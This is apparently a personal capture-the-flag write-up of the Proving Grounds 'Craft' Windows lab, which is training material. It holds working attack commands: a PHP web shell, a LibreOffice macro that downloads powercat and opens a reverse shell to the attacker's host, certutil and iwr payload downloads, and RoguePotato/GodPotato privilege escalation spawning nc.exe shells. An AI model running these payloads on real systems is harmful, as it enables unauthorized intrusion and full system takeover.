# NMAP

```
sudo nmap -sC -sV -Pn 192.168.247.169 -oN nmap-craft
```

![[PG/Windows/attachments/Pasted image 20250704155129.png]]

All ports
```
sudo nmap -p- -Pn 192.168.247.169 -oN nmap-craft-all-ports
```


# Website 
![[PG/Windows/attachments/Pasted image 20250704155243.png]]

File upload 
![[PG/Windows/attachments/Pasted image 20250704155303.png]]
- Email: `admin@craft.offsec`

# Gobuster

```
gobuster dir -u http://192.168.247.169 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobust.out
```


Navigate to upload.php and see the file ext the server expects 

![[PG/Windows/attachments/Pasted image 20250704155553.png]]

Try to upload webshell with .odt extension. 

```
<?php system($_GET['cmd']); ?>
```

![[PG/Windows/attachments/Pasted image 20250704155730.png]]
- Upload succeeded

![[PG/Windows/attachments/Pasted image 20250704155756.png]]

![[PG/Windows/attachments/Pasted image 20250704155931.png]]
Where is the file though...

Creds Given 

```
thecybergeek / ABasedHacker!
```

Need to install libreoffice and create a macro file to upload odt file 

[Blog post](https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc) for creating these malicious macro docs 
Test macro code 
```
Shell("cmd /c powershell iwr http://192.168.45.152/")
```
Test macro 
![[PG/Windows/attachments/Pasted image 20250704211302.png]]

Macro with rev shell

```
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.152/powercat.ps1');powercat -c 192.168.45.152 -p 135 -e powershell")
```

![[PG/Windows/attachments/Pasted image 20250704211603.png]]

![[PG/Windows/attachments/Pasted image 20250704211844.png]]

Caught rev shell 

![[PG/Windows/attachments/Pasted image 20250704211901.png]]

# Enum for Priv Esc 

![[PG/Windows/attachments/Pasted image 20250704212155.png]]

## Winpeas

There's an apache user. We can write to C:\xampp\htdocs 

Upload a reverse shell to try to laterally move to apache user who may have better permissions. 

Pop this rev shell in the dir. 

```
iwr http://192.168.45.152:1234/rev-shell.php -outfile rev-shell.php
```

![[PG/Windows/attachments/Pasted image 20250704235144.png]]

I'm apache :) 

![[PG/Windows/attachments/Pasted image 20250704235212.png]]

And I have **SeImpersonatePrivilege**

![[PG/Windows/attachments/Pasted image 20250704235250.png]]

# Potato 🥔

Systeminfo 

![[PG/Windows/attachments/Pasted image 20250704235514.png]]
- Windows Server 2019 Standard, x64 

Rogue Potato may work. 

```
./roguepotato.exe -r 192.168.45.152 -e "nc.exe 192.168.45.152 3001 -e cmd.exe" -l 9999
```

it did not :) 

It's [GodPotato](https://github.com/BeichenDream/GodPotato/releases?source=post_page-----4a62baf140cc---------------------------------------)

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```
![[PG/Windows/attachments/Pasted image 20250705001717.png]]

Transfer to box

```
certutil -urlcache -split -f http://192.168.45.152:4444/GodPotato-NET4.exe
```

![[PG/Windows/attachments/Pasted image 20250705002022.png]]

Test 

```
.\GodPotato-NET4.exe -cmd "whoami"
```

It works 

![[PG/Windows/attachments/Pasted image 20250705002113.png]]

Rev shell time

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.152 3001  -e c:\windows\system32\cmd.exe"
```

![[PG/Windows/attachments/Pasted image 20250705002318.png]]

Catch rev shell 

![[PG/Windows/attachments/Pasted image 20250705002342.png]]

Ref: https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc